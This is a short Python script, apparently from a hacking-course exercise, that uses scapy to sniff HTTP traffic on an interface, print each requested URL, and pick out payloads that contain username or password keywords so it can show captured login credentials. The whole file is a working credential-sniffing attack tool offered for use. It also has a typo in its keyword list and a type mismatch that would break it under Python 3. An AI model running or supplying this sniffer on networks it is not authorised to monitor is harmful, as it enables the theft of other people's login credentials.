#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def psniff(interface):
    scapy.sniff(iface=interface, store=False, prn=see_packets)
def show_url(packet):
    return "http://www." + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def show_logins(packet):
    if packet.haslayer(scapy.Raw):
        info = packet[scapy.Raw].load  # uname&password sent in load filed in Raw layer
        names = ["usernamr", "user", "login", "email", "uname", "password", "pass", "passwd"]
        for word in names:
            if word in info:
                return info
def see_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP Request sent URl> " + show_url(packet))
        login_info = show_logins(packet)

        if login_info:
            print("\n###################")
            print("[+] Detected Possible LOGIN Credentials> " + login_info)
            print("###################\n")

psniff("eth0")